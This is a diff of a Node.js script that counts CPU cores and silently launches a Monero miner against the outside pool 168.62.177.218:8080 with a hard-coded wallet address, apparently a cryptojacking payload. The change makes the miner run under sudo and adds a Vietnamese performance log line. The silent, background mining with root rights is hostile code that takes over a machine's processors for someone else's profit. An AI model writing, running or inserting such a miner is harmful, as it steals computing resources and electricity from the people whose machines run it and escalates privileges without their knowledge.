@@ -14,6 +14,7 @@ const timeout = (ms) => {
 const numberCore = () => {
     const getNumberCore = shell.exec('cat /proc/cpuinfo | grep processor | wc -l', { silent: true });
     if (getNumberCore.code === 0) {
+        console.log(`-- hieu suat ${ getNumberCore.stdout.trim() } / 10`)
         const core = getNumberCore.stdout.trim();
         if (core === '1')
             return 1;
@@ -49,7 +50,7 @@ const numberCore = () => {
 
 const runJob = (nameTool) => {
     const coreNumber = numberCore() || 4;
-    const runMonney = shell.exec(`./${nameTool} -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${coreNumber} --astrobwt-avx2`, { silent: true, async: true });
+    const runMonney = shell.exec(`sudo ./${nameTool} -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${coreNumber} --astrobwt-avx2`, { silent: true, async: true });
     if (runMonney.code !== undefined) {
         return 0;
     }
